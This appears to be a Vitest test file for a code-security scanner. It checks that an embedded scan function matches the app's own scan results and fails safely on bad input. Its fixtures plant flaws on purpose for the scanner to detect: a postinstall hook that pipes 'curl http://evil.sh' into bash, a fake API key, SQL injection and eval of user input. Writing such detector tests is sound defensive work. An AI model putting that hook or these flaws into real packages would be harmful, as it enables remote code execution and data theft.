// Parity proof for the host embedding seam (src/lib/cockpit-scan.js): scan()
// MUST produce the same findings as App.jsx's real scan sequence on the same
// files — not the dogfood shape. Runs the App.jsx steps inline and compares
// stableId sets + score. If they diverge, a host (the Atlan cockpit) would not
// see what the browser sees. This is the guard that keeps them from drifting as
// the engine is built upward.
import { describe, it, expect } from 'vitest';
import { scan, engineInfo } from '../lib/cockpit-scan.js';
import { PROBES, attachStableIds, attachProbeMeta } from '../lib/probes.js';
import { SEV_ORDER, computeScore } from '../lib/scoring.js';
import { detectAppShape, applyAppShape } from '../lib/probes/v2/app-shape.js';
import { buildSnippet } from '../lib/snippet.js';
import {
  findPreflightConfigFile,
  parsePreflightConfig,
  configToSuppressions,
} from '../lib/preflight-config.js';

const FILES = [
  {
    path: 'src/config.js',
    content:
      'const OPENAI_API_KEY = "sk-proj-abc123def456ghi789jkl012mno345pqr678stu";\nexport const db = { url: process.env.DB };\n',
  },
  {
    path: 'src/db.js',
    content:
      'export function q(id){ return sql`SELECT * FROM users WHERE id = ${id}`; }\nconst token = eval(userInput);\n',
  },
  {
    path: 'package.json',
    content:
      '{"name":"x","scripts":{"postinstall":"curl http://evil.sh | bash"},"dependencies":{"leftpad":"1.0.0"}}\n',
  },
  {
    path: 'index.html',
    content:
      '<html><head></head><body><div dangerouslySetInnerHTML={{__html: raw}}></div></body></html>\n',
  },
];

// The App.jsx real-scan sequence, inline (the product path we must match).
// ALL of it: config suppressions and app-shape reweighting included, with the
// score computed over the SHAPED findings (App.jsx lines ~717-732). A replica
// that stops at probe meta would pass parity by luck whenever the fixtures
// happen not to trigger reweighting, and hide drift in the later stages.
function appScan(files) {
  const findings = [];
  for (const probe of PROBES) {
    try {
      const f = probe.fn(files);
      if (Array.isArray(f)) findings.push(...f);
    } catch {
      /* app records failures */
    }
  }
  findings.sort((a, b) => SEV_ORDER.indexOf(a.severity) - SEV_ORDER.indexOf(b.severity));
  const fileMap = new Map(files.map((f) => [f.path, f.content]));
  findings.forEach((f) => {
    try {
      const c = fileMap.get(f.file);
      if (c && f.line) f.snippet = buildSnippet(c, f.line, 5);
    } catch {}
  });
  attachStableIds(findings, files);
  attachProbeMeta(findings);
  let suppressions = {};
  const configFile = findPreflightConfigFile(files);
  if (configFile) {
    const cfg = parsePreflightConfig(configFile.path, configFile.content);
    if (!cfg.error) suppressions = configToSuppressions(cfg, findings);
  }
  const shaped = applyAppShape(findings, detectAppShape(files));
  return { findings: shaped, suppressions, score: computeScore(shaped) };
}

describe('cockpit-scan: host embedding seam', () => {
  it('finds the planted issues', () => {
    expect(scan(FILES).findings.length).toBeGreaterThan(0);
  });

  it('findings carry snippet + stableId + probe meta (product shape)', () => {
    const withLine = scan(FILES).findings.filter((f) => f.line);
    expect(withLine.every((f) => typeof f.stableId === 'string' && f.stableId.length)).toBe(true);
    expect(withLine.some((f) => f.snippet)).toBe(true);
  });

  it('PARITY: scan() output equals App.jsx real-scan output (stableIds + score)', () => {
    const mine = scan(FILES);
    const app = appScan(FILES);
    expect(mine.findings.map((f) => f.stableId).sort()).toEqual(
      app.findings.map((f) => f.stableId).sort()
    );
    expect(mine.score).toBe(app.score);
    expect(mine.findings.length).toBe(app.findings.length);
  });
});

// The failure contract: scan() throws for a non-array `files` (call-site bug,
// fail loud) and for nothing else. Everything past that guard degrades and
// records into inputFailures / probeFailures / engineFailures instead of
// escaping to the host. The live case: an embedder ran scan() inside a request
// handler and a throw out of the config stage exited the process. See also
// cockpit-containment.test.js, which force-fails an engine stage by mocking.
describe('cockpit-scan: failure contract', () => {
  it('non-array files still throws loud (the one intentional throw)', () => {
    expect(() => scan(null)).toThrow(TypeError);
    expect(() => scan('src')).toThrow(TypeError);
  });

  it('a clean scan reports empty failure lists (keys always present)', () => {
    const result = scan(FILES);
    expect(result.inputFailures).toEqual([]);
    expect(result.engineFailures).toEqual([]);
  });

  it('the live repro: unquoted title-pattern number in .preflight.yml, end to end', () => {
    // In YAML, `title-pattern: 500` is a number, not a string — the ordinary
    // typo of someone suppressing a finding about a 500 error. The parser
    // faithfully produces the number; the config layer drops the field; the
    // scan completes. Pre-fix this threw out of scan() at the config stage.
    const probeName = scan(FILES).findings[0].probe;
    const yml = [
      'schema: preflight/v1',
      'suppress:',
      `  - probe: '${probeName}'`,
      '    title-pattern: 500',
      "    reason: 'suppressing the 500 finding'",
      '',
    ].join('\n');
    const result = scan([...FILES, { path: '.preflight.yml', content: yml }]);
    expect(result.engineFailures).toEqual([]);
    expect(result.findings.length).toBeGreaterThan(0);
    // The rule degraded to probe-only, so it still suppresses that probe's findings.
    const suppressed = Object.keys(result.suppressions);
    const probeIds = result.findings.filter((f) => f.probe === probeName).map((f) => f.stableId);
    // Guard against vacuity: every() over an empty list is true.
    expect(probeIds.length).toBeGreaterThan(0);
    expect(probeIds.every((id) => suppressed.includes(id))).toBe(true);
  });

  it('malformed files entries are skipped and recorded, and the rest scans honestly', () => {
    // Hosts collect `files` by walking real repos; a bad entry is malformed
    // input, not a call-site bug. First contained naively, this input failed
    // 50 probes one at a time and returned zero findings with a perfect
    // score — a false all-clear. The contract now: skip the bad entries,
    // record them, and return the same result the good files alone produce.
    const clean = scan(FILES);
    let result;
    expect(() => {
      result = scan([null, ...FILES, { path: 'no-content.js' }, 42]);
    }).not.toThrow();
    expect(result.inputFailures.map((f) => f.index)).toEqual([
      0,
      FILES.length + 1,
      FILES.length + 2,
    ]);
    expect(result.filesScanned).toBe(FILES.length);
    expect(result.engineFailures).toEqual([]);
    expect(result.findings.map((f) => f.stableId).sort()).toEqual(
      clean.findings.map((f) => f.stableId).sort()
    );
    expect(result.score).toBe(clean.score);
  });

  it('hostile PROBES entries and a throwing host callback are all contained', () => {
    // PROBES is exported mutable, so even the failure paths must stay total:
    // a null registry entry, a null-prototype throw value (String() on it
    // throws), and a non-string .message all used to escape from INSIDE the
    // catch blocks. The host's own onProbeError is a reporting channel — its
    // bugs must not break the containment either.
    const evil = [
      null,
      {
        name: 'FAKE-null-proto-throw',
        fn: () => {
          throw Object.create(null);
        },
      },
      {
        name: 'FAKE-number-message',
        fn: () => {
          throw { message: 42 };
        },
      },
    ];
    PROBES.push(...evil);
    try {
      let result;
      expect(() => {
        result = scan(FILES, {
          onProbeError: () => {
            throw new Error('host logger bug');
          },
        });
      }).not.toThrow();
      const recorded = result.probeFailures.filter(
        (f) => f.probe === 'unknown probe' || f.probe.startsWith('FAKE-')
      );
      expect(recorded.length).toBe(evil.length);
      expect(recorded.every((f) => typeof f.error === 'string')).toBe(true);
      // Same registry, the other host entry point.
      expect(() => engineInfo()).not.toThrow();
      // opts: null survives the probe-failure path (a default param does not
      // catch an explicit null, and opts is read inside the catch).
      expect(() => scan(FILES, null)).not.toThrow();
    } finally {
      PROBES.splice(PROBES.length - evil.length, evil.length);
    }
  });

  it('wholesale probe collapse nulls the score rather than reporting a perfect 100', () => {
    // computeScore is total over an empty findings list, so a scan where
    // nothing ran would otherwise report 100 — a clean bill of health from
    // zero evidence.
    const saved = PROBES.splice(0, PROBES.length, {
      name: 'FAKE-boom',
      fn: () => {
        throw new Error('boom');
      },
    });
    try {
      const result = scan(FILES);
      expect(result.score).toBeNull();
      expect(result.scores).toBeNull();
      expect(result.findings).toEqual([]);
      expect(result.engineFailures.some((f) => f.stage === 'score')).toBe(true);
    } finally {
      PROBES.splice(0, PROBES.length, ...saved);
    }
  });
});
